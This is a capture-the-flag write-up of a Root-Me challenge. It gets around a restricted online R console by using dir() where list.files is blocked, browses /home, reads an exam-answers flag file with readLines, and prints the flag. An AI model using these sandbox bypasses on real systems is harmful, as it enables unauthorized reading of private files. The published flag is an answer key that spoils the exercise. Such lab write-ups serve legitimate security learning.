# R Code Execution

URL: [https://www.root-me.org/en/Challenges/App-Script/R-Code-Execution](https://www.root-me.org/en/Challenges/App-Script/R-Code-Execution)

## Statement

Your Statistical Analysis Reviews in R are approaching. Your teacher has made an R interpreter available on the ENT of the university so that you can practice. You don’t have time to revise, you decide to steal the exam papers.

## Solution

Once we start the challenge we are redirected to interactive R console. `system` call is disabled.

![r-code-execution.png](/assets/ctf/root-me/r-code-execution.png)

[R: List the Files in a Directory/Folder](https://stat.ethz.ch/R-manual/R-devel/library/base/html/list.files.html)

The following was blocked
```r
list.files(R.home())
list.dirs(R.home("doc"))
list.dirs(R.home("doc"), full.names = FALSE)
```

But dir function was not
```bash
dir("../..", pattern = "^[a-lr]", full.names = TRUE, ignore.case = TRUE)
```

Get files in current directory:
```r
dir(".", recursive = TRUE)
```

![r-code-execution-1.png](/assets/ctf/root-me/r-code-execution-1.png)

The description mentioned something about teacher, so maybe `/home/*`

```r
dir("/home", recursive = TRUE)
```

![r-code-execution-2.png](/assets/ctf/root-me/r-code-execution-2.png)

[R: Read Text Lines from a Connection](https://stat.ethz.ch/R-manual/R-devel/library/base/html/readLines.html)

```r
readLines('/home/prof-stats/corriges_examens_analyses_stats/2021/flag.txt')
```

![r-code-execution-3.png](/assets/ctf/root-me/r-code-execution-3.png)

> Flag: `C0nGr47ul4T10n_y0u_ll_H4v3_A_G00d_Gr4D3`

